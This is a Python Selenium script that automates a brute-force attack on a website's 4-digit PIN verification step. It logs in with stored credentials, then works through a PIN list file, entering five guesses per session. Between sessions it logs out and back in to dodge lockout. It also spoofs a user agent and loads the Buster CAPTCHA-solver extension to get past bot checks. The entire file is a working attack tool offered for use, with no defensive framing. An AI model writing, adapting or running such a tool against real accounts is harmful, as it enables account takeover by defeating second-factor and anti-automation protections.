from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import random
import time
from os.path import exists

# Browser
browser_select = "chrome"

# Site credentials
username = "username@domain.com"
password = "password"
login_url = "https://www.website.com/login"

if browser_select == "firefox":
    test_ua = 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36'
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", test_ua)
    driver = webdriver.Firefox(profile)
    buster = "buster_captcha_solver-2.0.1.xpi"
    driver.install_addon(buster, temporary=True)
else:
    capabilities = DesiredCapabilities.CHROME
    capabilities["goog:loggingPrefs"] = {
        "performance": "ALL"}  # chromedriver 75+
    test_ua = "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
    options = webdriver.ChromeOptions()
    options.add_argument(f'--user-agent={test_ua}')
    options.add_argument('--incognito')
    options.add_argument('--no-sandbox')
    chrome_options = Options()
    chrome_options.add_experimental_option("detach", True)
    chrome_options.add_extension(
        'Buster Captcha Solver for Humans - Chrome Web Store 2.0.1.0.crx')
    driver = webdriver.Chrome('./chromedriver', chrome_options=chrome_options,
                              desired_capabilities=capabilities, options=options)


def login():
    # Head to login page
    driver.get(login_url)

    # Wait new page to load
    delay = 600  # seconds
    try:
        WebDriverWait(driver, delay).until(
            lambda d: d.find_element("name", "email"))
    except TimeoutException:
        print("Loading took too much time!")
        exit(1)
    # find username/email field and send the username itself to the input field
    driver.find_element("name", "email").send_keys(username)

    # Wait new page to load
    delay = 600  # seconds
    try:
        WebDriverWait(driver, delay).until(
            lambda d: d.find_element("name", "password"))
    except TimeoutException:
        print("Loading took too much time!")
        exit(1)
    # find password input field and insert password as well
    driver.find_element("name", "password").send_keys(password)

    # Click login button
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/button").click()


def write_pin(pin_to_write):
    # Wait new page to load
    delay = 600  # seconds
    try:
        WebDriverWait(driver, delay).until(lambda d: d.find_element(
            By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[1]/div[1]/input[1]"))
    except TimeoutException:
        print("Loading took too much time!")
        exit(1)

    # time.sleep(random.randint(1,1000)/1000)
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[1]/div[1]/input[1]").send_keys(pin_to_write[0])
    # time.sleep(random.randint(1,1000)/1000)
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[1]/div[1]/input[2]").send_keys(pin_to_write[1])
    # time.sleep(random.randint(1,1000)/1000)
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[1]/div[1]/input[3]").send_keys(pin_to_write[2])
    # time.sleep(random.randint(1,1000)/1000)
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[1]/div[1]/input[4]").send_keys(pin_to_write[3])
    # time.sleep(random.randint(1,1000)/1000)

    count = 0
    if (exists('tried_pins.txt')):
        # Count lines
        f = open('tried_pins.txt', 'r')

        for line in f:
            count += 1
        f.close()

    # Write line number and pin code
    with open('tried_pins.txt', 'a') as f:
        f.write("Line: " + str(count) + " " + pin_to_write)
    f.close()


def logout():
    # Wait new page to load
    delay = 600  # seconds
    try:
        WebDriverWait(driver, delay).until(lambda d: d.find_element(
            By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[2]/a"))
    except TimeoutException:
        print("Loading took too much time!")
        exit(1)
    driver.find_element(
        By.XPATH, "/html/body/div[2]/div/div/div[2]/div[1]/div[1]/form/div[2]/a").click()


def main():
    # Open password file
    file1 = open('pin_lists/4_digits_pin_list.txt', 'r')

    while True:

        login()

        time.sleep(10)

        # Try passwords
        for i in range(0, 5):
            line = file1.readline()
            if not line:
                break

            write_pin(line)
            print("Password tested: {}".format(line.strip()))

        # time.sleep(random.randint(1000,4000)/1000)
        logout()
        # time.sleep(random.randint(1000,4000)/1000)

    file1.close()


main()
